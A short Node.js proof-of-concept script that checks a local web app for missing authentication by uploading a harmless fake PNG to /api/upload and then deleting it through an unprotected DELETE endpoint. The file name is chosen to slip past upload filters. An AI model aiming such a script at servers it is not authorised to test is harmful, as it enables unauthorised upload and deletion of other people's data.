import fs from 'node:fs';

const API_BASE = 'http://localhost:3000';

async function testVulnerability() {
    console.log('--- PoC: Unprotected File Upload (Zero-Dependency) ---');

    // 1. Create a dummy "malicious" file
    const filePath = './poc_malicious.png'; // Using .png to pass filters
    fs.writeFileSync(filePath, 'Fake image content for security testing');

    const formData = new FormData();
    const fileContent = fs.readFileSync(filePath);
    const blob = new Blob([fileContent], { type: 'image/png' });
    formData.append('image', blob, 'poc_malicious.png');

    try {
        const response = await fetch(`${API_BASE}/api/upload`, {
            method: 'POST',
            body: formData
        });

        const data = await response.json();
        console.log('Upload Status:', response.status);
        console.log('Upload Response:', JSON.stringify(data));

        if (response.status === 200 && data.imageUrl) {
            console.log('🚩 VULNERABILITY CONFIRMED: Successfully uploaded file without authentication!');
            console.log('Uploaded File URL:', data.imageUrl);

            // 2. Try to delete it (also unprotected)
            const filename = data.imageUrl.split('/').pop();
            console.log(`Attempting to delete: ${filename}`);

            const delResponse = await fetch(`${API_BASE}/api/upload/${filename}`, {
                method: 'DELETE'
            });

            const delData = await delResponse.json();
            console.log('Delete Status:', delResponse.status);
            console.log('Delete Response:', JSON.stringify(delData));

            if (delResponse.status === 200) {
                console.log('🚩 VULNERABILITY CONFIRMED: Successfully deleted file without authentication!');
            }
        } else {
            console.log('Upload failed. Status:', response.status, data);
        }
    } catch (error) {
        console.error('Error during PoC:', error.message);
    } finally {
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
    }
}

testVulnerability();
